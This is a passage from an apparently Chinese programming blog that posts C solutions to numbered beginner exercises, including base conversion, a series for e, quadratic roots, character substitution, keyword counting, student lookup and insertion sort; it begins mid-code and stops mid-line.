f2;</span></span><br><span class="line"><span class="comment">    cin&gt;&gt;n;</span></span><br><span class="line"><span class="comment">    f1 = 0;</span></span><br><span class="line"><span class="comment">    f2 = 1;</span></span><br><span class="line"><span class="comment">    while(n--&gt;1)&#123;</span></span><br><span class="line"><span class="comment">        f2 += f1;</span></span><br><span class="line"><span class="comment">        f1 = f2 - f1;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    cout&lt;&lt;(n==-1?0:f2)&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="1028递归转换进制"><a href="#1028递归转换进制" class="headerlink" title="1028递归转换进制"></a>1028递归转换进制</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//#define A 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> B 7</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;B)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,n);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        change(n/B);</span><br><span class="line">        change(n%B);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(; n&gt;<span class="number">0</span>; n--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;m);</span><br><span class="line">        change(m);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1029求自然对数"><a href="#1029求自然对数" class="headerlink" title="1029求自然对数"></a>1029求自然对数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">double</span> fenMu=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">double</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;fenMu<span class="number">-1e15</span>&lt;<span class="number">0</span>;i++)&#123;</span><br><span class="line">        fenMu*=i;</span><br><span class="line">        ans+=<span class="number">1.0</span>/fenMu;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.14lf\n"</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1030二次方程"><a href="#1030二次方程" class="headerlink" title="1030二次方程"></a>1030二次方程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fangcheng</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> x1,x2,dal;</span><br><span class="line">    <span class="keyword">if</span>(a!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b*b<span class="number">-4</span>*a*c&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            dal=<span class="built_in">pow</span>(b*b<span class="number">-4</span>*a*c,<span class="number">0.5</span>);</span><br><span class="line">            x1=(-b-dal)/(<span class="keyword">double</span>)(<span class="number">2</span>*a);</span><br><span class="line">            x2=(-b+dal)/(<span class="keyword">double</span>)(<span class="number">2</span>*a);</span><br><span class="line">            <span class="keyword">if</span>(a&lt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dal=x1;</span><br><span class="line">                x1=x2;</span><br><span class="line">                x2=dal;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%.2lf %.2lf"</span>,x1,x2);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(b*b<span class="number">-4</span>*a*c==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(b==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"0.00"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%.2lf"</span>,-(<span class="keyword">double</span>)b/(<span class="number">2</span>*a));</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"NULL"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(c==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"NULL"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"NULL"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(c==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"0.00"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%.2lf"</span>,-c/(<span class="keyword">double</span>)b);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,a,b,c,i;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;a,&amp;b,&amp;c);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Case %d: "</span>,i);</span><br><span class="line">        fangcheng(a,b,c);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1034十进制转二进制"><a href="#1034十进制转二进制" class="headerlink" title="1034十进制转二进制"></a>1034十进制转二进制</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,i,j;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> a;</span><br><span class="line">    <span class="keyword">int</span> b[<span class="number">33</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;a);</span><br><span class="line">        j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(a==<span class="number">0</span>)&#123;<span class="built_in">printf</span>(<span class="string">"%ld\n"</span>,a);<span class="keyword">continue</span>;&#125;</span><br><span class="line">        <span class="keyword">while</span>(a!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            b[j++]=a%<span class="number">2</span>;</span><br><span class="line">            a=a/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(--j&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d"</span>,b[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1035十进制转其他"><a href="#1035十进制转其他" class="headerlink" title="1035十进制转其他"></a>1035十进制转其他</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,i,j,jidi;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> a;</span><br><span class="line">    <span class="keyword">int</span> b[<span class="number">33</span>];</span><br><span class="line"><span class="comment">//    scanf("%d",&amp;n);</span></span><br><span class="line">    n=<span class="number">60000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"本程序提供2**32以下十进制正整数转任意36以内进制结果\</span></span><br><span class="line"><span class="string">           \n输入(-1,-1)结束\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请每次输入两个数，前者作为基底，后者待转换\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%lld"</span>,&amp;jidi,&amp;a);<span class="keyword">if</span>(jidi==<span class="number">-1</span>)&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">        j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(a==<span class="number">0</span>)&#123;<span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,a);<span class="keyword">continue</span>;&#125;</span><br><span class="line">        <span class="keyword">while</span>(a!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            b[j++]=a%jidi;</span><br><span class="line">            a=a/jidi;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(--j&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(b[j]&gt;<span class="number">9</span>)&#123;<span class="built_in">printf</span>(<span class="string">"%c"</span>,<span class="string">'A'</span><span class="number">-10</span>+b[j]);&#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;<span class="built_in">printf</span>(<span class="string">"%d"</span>,b[j]);&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1036字符替换"><a href="#1036字符替换" class="headerlink" title="1036字符替换"></a>1036字符替换</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">substitute</span><span class="params">(<span class="keyword">char</span> str[], <span class="keyword">char</span> oldchar, <span class="keyword">char</span> newchar)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> time=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(str[i]!=<span class="string">'\0'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(str[i]==oldchar)</span><br><span class="line">        &#123;</span><br><span class="line">            str[i]=newchar;</span><br><span class="line">            time++;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> time;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">1001</span>];</span><br><span class="line">    <span class="keyword">char</span> oldchar,newchar;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%s %c %c"</span>, str, &amp;oldchar, &amp;newchar) == <span class="number">3</span>) <span class="comment">/* 或!= EOF , 但前者更好 */</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,substitute(str,oldchar,newchar));</span><br><span class="line">        <span class="built_in">puts</span>(str); <span class="comment">//处理</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1037关键词统计"><a href="#1037关键词统计" class="headerlink" title="1037关键词统计"></a>1037关键词统计</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,n,times,flag;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">10</span>][<span class="number">11</span>];</span><br><span class="line">    <span class="keyword">char</span> long_str[<span class="number">10001</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,long_str);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            times=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="built_in">strlen</span>(long_str)-<span class="built_in">strlen</span>(str[i])+<span class="number">1</span>;)&#123;</span><br><span class="line">            <span class="keyword">if</span>(long_str[j]==str[i][<span class="number">0</span>])&#123;</span><br><span class="line">                flag=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;<span class="built_in">strlen</span>(str[i]);k++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(long_str[j+k]!=str[i][k])&#123;</span><br><span class="line">                        flag=<span class="number">1</span>;<span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(flag==<span class="number">1</span>)&#123;j++;&#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    times++;j+=k;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;j++;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,times);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1037学号查询"><a href="#1037学号查询" class="headerlink" title="1037学号查询"></a>1037学号查询</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">char</span> birth[<span class="number">9</span>];</span><br><span class="line">    <span class="keyword">char</span> num[<span class="number">9</span>];</span><br><span class="line">    <span class="keyword">char</span> major[<span class="number">32</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>[30];</span></span><br><span class="line">    <span class="keyword">int</span> i,j,n;</span><br><span class="line">    <span class="keyword">char</span> num1[<span class="number">9</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">30</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s %s %s %s"</span>,stu[i].name,stu[i].birth,stu[i].num,stu[i].major);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,num1);</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">30</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(stu[j].num,num1)==<span class="number">0</span>)&#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">"%s %s %s %s\n"</span>,stu[j].name,stu[j].birth,stu[j].num,stu[j].major);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">30</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Not found\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1038插入排序"><a href="#1038插入排序" class="headerlink" title="1038插入排序"></a>1038插入排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nCase,i,j,k,temp;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> s[<span class="number">1000</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;nCase);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;nCase; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,s+j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            temp=s[j];</span><br><span class="line">            <span class="keyword">for</span>(k=j<span class="number">-1</span>; k&gt;=<span class="number">0</span>; k--)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(s[k]&gt;temp)</span><br><span class="line">                &#123;</span><br><span class="line">                    s[k+<span class="number">1</span>]=s[k];</span><br><span 